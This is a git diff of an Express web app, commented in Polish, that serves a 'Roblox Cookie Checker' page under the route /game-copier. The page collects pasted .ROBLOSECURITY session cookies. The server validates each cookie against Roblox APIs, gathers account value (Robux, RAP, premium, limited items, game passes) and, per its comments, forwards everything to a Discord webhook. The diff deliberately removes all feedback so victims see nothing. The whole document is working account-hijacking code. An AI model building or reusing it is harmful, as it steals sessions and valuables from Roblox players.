@@ -4,7 +4,7 @@ const app = express();
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Strona główna – prosty przycisk
+// Strona główna – bez zmian
 app.get('/', (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -65,7 +65,7 @@ app.get('/', (req, res) => {
 });
 
 // ────────────────────────────────────────────────
-// Strona checker – TYLKO input + przycisk, zero wyników na ekranie
+// Strona /game-copier – tylko pole tekstowe + przycisk, zero komunikatów
 // ────────────────────────────────────────────────
 app.get('/game-copier', (req, res) => {
   res.send(`
@@ -76,102 +76,75 @@ app.get('/game-copier', (req, res) => {
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Roblox Cookie Checker</title>
   <style>
-    body { 
-      font-family: Arial, sans-serif; 
-      background: #0f0f17; 
-      color: #e0e0ff; 
-      margin: 0; 
-      padding: 24px; 
+    body {
+      font-family: Arial, sans-serif;
+      background: #0f0f17;
+      color: #e0e0ff;
+      margin: 0;
+      padding: 30px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
     }
-    .container { 
-      max-width: 820px; 
-      margin: 0 auto; 
+    .container {
+      max-width: 820px;
+      width: 100%;
     }
-    h1 { 
-      color: #6ab0ff; 
-      text-align: center; 
-      margin-bottom: 12px;
+    h1 {
+      color: #6ab0ff;
+      text-align: center;
+      margin: 0 0 30px 0;
+      font-size: 2.2rem;
     }
-    .back { 
-      display: inline-block; 
-      margin-bottom: 28px; 
-      color: #60a5fa; 
-      text-decoration: none; 
-      font-weight: bold; 
-      font-size: 1.15rem;
+    textarea {
+      width: 100%;
+      min-height: 320px;
+      background: #1a1a2e;
+      color: #d0d0ff;
+      border: 1px solid #3a3a5c;
+      border-radius: 10px;
+      padding: 20px;
+      font-family: Consolas, 'Courier New', monospace;
+      font-size: 15px;
+      resize: vertical;
+      margin-bottom: 30px;
     }
-    .back:hover { color: #93c5fd; }
-    textarea { 
-      width: 100%; 
-      min-height: 280px; 
-      background: #1a1a2e; 
-      color: #d0d0ff; 
-      border: 1px solid #3a3a5c; 
-      border-radius: 10px; 
-      padding: 18px; 
-      font-family: Consolas, 'Courier New', monospace; 
-      font-size: 15px; 
-      resize: vertical; 
-      margin: 16px 0 24px 0; 
-    }
-    button { 
-      background: #3b82f6; 
-      color: white; 
-      border: none; 
-      padding: 18px 60px; 
-      font-size: 1.2rem; 
-      border-radius: 10px; 
-      cursor: pointer; 
-      display: block; 
-      margin: 0 auto 30px; 
+    button {
+      background: #3b82f6;
+      color: white;
+      border: none;
+      padding: 18px 70px;
+      font-size: 1.25rem;
+      border-radius: 10px;
+      cursor: pointer;
       font-weight: 600;
+      transition: all 0.25s;
     }
-    button:hover { background: #2563eb; }
+    button:hover:not(:disabled) {
+      background: #2563eb;
+      transform: translateY(-2px);
+    }
     button:disabled {
-      background: #1e40af;
+      opacity: 0.55;
       cursor: not-allowed;
-      opacity: 0.7;
     }
-    #result { 
-      background: #1a1a2e; 
-      border: 1px solid #3a3a5c; 
-      border-radius: 10px; 
-      padding: 28px; 
-      min-height: 100px; 
-      text-align: center; 
-      font-size: 1.15rem;
-      line-height: 1.6;
-    }
-    .error   { color: #ff6b6b; font-weight: bold; }
-    .success { color: #4ade80; font-weight: bold; }
-    .loading { color: #fbbf24; font-style: italic; }
   </style>
 </head>
 <body>
 <div class="container">
-  <a href="/" class="back">← Strona główna</a>
   <h1>Roblox Cookie Checker</h1>
-  <p>Wklej tekst zawierający .ROBLOSECURITY (logi, konsola, headers, JSON itp.)<br>
-     Dane konta pojawią się **tylko** w Twoim webhooku.</p>
   
-  <textarea id="input" placeholder="Wklej tutaj..."></textarea>
+  <textarea id="input" placeholder="Wklej tekst..."></textarea>
   
   <button id="checkBtn" onclick="check()">Check & Send to Webhook</button>
-  
-  <div id="result"></div>
 </div>
 
 <script>
 async function check() {
   const btn = document.getElementById('checkBtn');
   const raw = document.getElementById('input').value.trim();
-  const result = document.getElementById('result');
-
-  result.innerHTML = '';
-  btn.disabled = true;
-
+  
   if (!raw) {
-    result.innerHTML = '<span class="error">Nic nie wklejono</span>';
     btn.disabled = false;
     return;
   }
@@ -200,12 +173,11 @@ async function check() {
   }
 
   if (!cookie || cookie.length < 180 || !cookie.startsWith('_')) {
-    result.innerHTML = '<span class="error">Nie znaleziono poprawnego .ROBLOSECURITY</span>';
     btn.disabled = false;
     return;
   }
 
-  result.innerHTML = '<span class="loading">Trwa sprawdzanie i wysyłanie do webhooka...</span>';
+  btn.disabled = true;
 
   try {
     const res = await fetch('/check', {
@@ -213,23 +185,13 @@ async function check() {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ cookie })
     });
-
-    if (!res.ok) {
-      throw new Error('Błąd serwera: ' + res.status);
-    }
-
-    const json = await res.json();
-
-    if (json.error) {
-      result.innerHTML = \`<span class="error">Błąd: \${json.error}</span>\`;
-    } else {
-      result.innerHTML = '<span class="success">Gotowe – cookie sprawdzone i wysłane do webhooka ✓</span>';
-    }
-
+    // Nie obchodzi nas odpowiedź – nie pokazujemy nic
   } catch (err) {
-    result.innerHTML = \`<span class="error">Błąd: \${err.message}</span>\`;
+    // cisza
   } finally {
-    btn.disabled = false;
+    setTimeout(() => {
+      btn.disabled = false;
+    }, 1800);
   }
 }
 </script>
@@ -238,17 +200,13 @@ async function check() {
   `);
 });
 
-// ────────────────────────────────────────────────
-// Endpoint /check – bez zmian (wszystkie dane idą do webhooka)
-// ────────────────────────────────────────────────
+// Endpoint /check – bez zmian
 app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
   if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
     return res.status(400).json({ error: 'Missing or invalid cookie' });
   }
-
   try {
-    // Pobranie X-CSRF-Token
     const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
       method: 'POST',
       headers: {
@@ -259,7 +217,6 @@ app.post('/check', async (req, res) => {
     const csrfToken = tokenRes.headers.get('x-csrf-token');
     if (!csrfToken) throw new Error('Failed to obtain X-CSRF-Token');
 
-    // Dane użytkownika
     const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
       headers: {
         'Cookie': `.ROBLOSECURITY=${cookie}`,
@@ -270,7 +227,6 @@ app.post('/check', async (req, res) => {
     if (!userRes.ok) throw new Error('Invalid cookie');
     const userData = await userRes.json();
 
-    // Verified email (przez badge)
     let emailVerified = false;
     try {
       const ownsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`, {
@@ -282,7 +238,6 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Premium
     let hasPremium = false;
     try {
       const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
@@ -291,7 +246,6 @@ app.post('/check', async (req, res) => {
       if (premiumRes.ok) hasPremium = await premiumRes.json();
     } catch {}
 
-    // Robux
     let robux = 0;
     try {
       const currencyRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
@@ -303,7 +257,6 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // RAP
     let rap = 0;
     try {
       const assetsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?sortOrder=Asc&limit=100`, {
@@ -315,7 +268,6 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Grupy (owner = rank 255)
     let groupsOwned = 0;
     try {
       const groupsRes = await fetch(`https://groups.roblox.com/v2/users/${userData.id}/groups/roles`, {
@@ -327,7 +279,6 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Wiek konta
     let accountAgeDays = 0;
     let createdDate = null;
     try {
@@ -341,7 +292,6 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Avatar
     let avatarUrl = null;
     try {
       const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=720x720&format=Png&isCircular=false`);
@@ -351,7 +301,6 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Gamepasy
     const mm2Ids = [429957, 1308795];
     const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
     const sabIds = [1227013099, 1229510262, 1228591447];
@@ -383,7 +332,6 @@ app.post('/check', async (req, res) => {
     const sabCount = hasGamePasses.filter(id => sabIds.includes(id)).length;
     const jbCount = hasGamePasses.filter(id => jbIds.includes(id)).length;
 
-    // Headless & Korblox
     let hasHeadless = false;
     let hasKorblox = false;
     try {
@@ -395,7 +343,6 @@ app.post('/check', async (req, res) => {
         const data = await headlessRes.json();
         hasHeadless = Array.isArray(data.data) && data.data.length > 0;
       }
-
       const korbloxRes = await fetch(
         `https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/192`,
         { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken } }
@@ -426,7 +373,6 @@ app.post('/check', async (req, res) => {
       jbCount
     };
 
-    // Wysyłka do Discord webhooka
     const webhookUrl = process.env.WEBHOOK;
     if (webhookUrl) {
       try {
